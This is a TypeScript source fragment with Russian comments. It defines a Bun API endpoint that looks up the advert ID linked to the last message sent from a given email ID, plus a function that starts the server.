// GET /api/get_advert_by_email?email_id=<id>
// Получить advertId по emailId из последнего сообщения
const handleGetAdvertByEmail = async (url: URL): Promise<Response> => {
  try {
    const email_id = url.searchParams.get("email_id");
    
    console.log(`[API] GET /api/get_advert_by_email`);
    console.log(`[API] GET /api/get_advert_by_email {"email_id":${email_id}}`);

    if (!email_id) {
      return createResponse({ success: false, error: "Missing required parameter: email_id" }, 400);
    }

    const emailIdNum = parseInt(email_id);
    if (isNaN(emailIdNum)) {
      return createResponse({ success: false, error: "Invalid email_id format" }, 400);
    }

    // Ищем сообщения по emailId (все сообщения отправленные с этой почты)
    const messages = await EmailMsgRepo.listByEmailId(emailIdNum);
    
    if (!messages || messages.length === 0) {
      console.log(`[API] No messages found for email_id=${emailIdNum}`);
      return createResponse({ 
        success: false, 
        error: "No messages found for this email_id" 
      }, 404);
    }

    // Берем последнее сообщение
    const lastMessage = messages[messages.length - 1];
    
    if (!lastMessage.advertId) {
      console.log(`[API] Message found but no advertId`);
      return createResponse({ 
        success: false, 
        error: "Message has no associated advertId" 
      }, 404);
    }

    console.log(`[API] Found advertId=${lastMessage.advertId} for email_id=${emailIdNum}`);
    
    return createResponse({
      success: true,
      data: {
        advert_id: lastMessage.advertId,
        message_id: lastMessage.id,
      },
    });
  } catch (error: any) {
    console.error("[API] Error in get_advert_by_email:", error);
    return createResponse(
      {
        success: false,
        error: "Internal server error",
        data: { message: error.message },
      },
      500
    );
  }
};

// Запуск сервера
export const startApiServer = (port = 3000) => {
  const server = Bun.serve({
    port,
    fetch: handleRequest,
  });

  console.log(`🚀 API Server running on http://localhost:${port}`);
  return server;
};
